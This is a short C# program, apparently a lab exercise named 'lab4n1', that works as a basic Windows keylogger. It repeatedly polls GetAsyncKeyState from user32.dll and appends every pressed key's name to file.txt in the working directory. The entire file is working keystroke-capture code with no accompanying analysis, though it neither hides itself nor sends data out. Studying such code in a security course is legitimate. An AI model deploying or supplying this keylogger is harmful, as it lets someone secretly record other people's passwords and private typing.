using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace lab4n1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            string path = Environment.CurrentDirectory + @"\file.txt";

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 8; i < 191; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        if (((ConsoleKey)i) == ConsoleKey.Spacebar)
                        {
                            File.AppendAllText(path, " ");
                        }
                        else if (((ConsoleKey)i) == ConsoleKey.Enter)
                        {
                            File.AppendAllText(path, "\r\n ");
                        }
                        else
                        {
                            File.AppendAllText(path, ((ConsoleKey)i).ToString());
                        }
                        File.AppendAllText(path, " ");
                    }
                }

            }

        }
    }
}
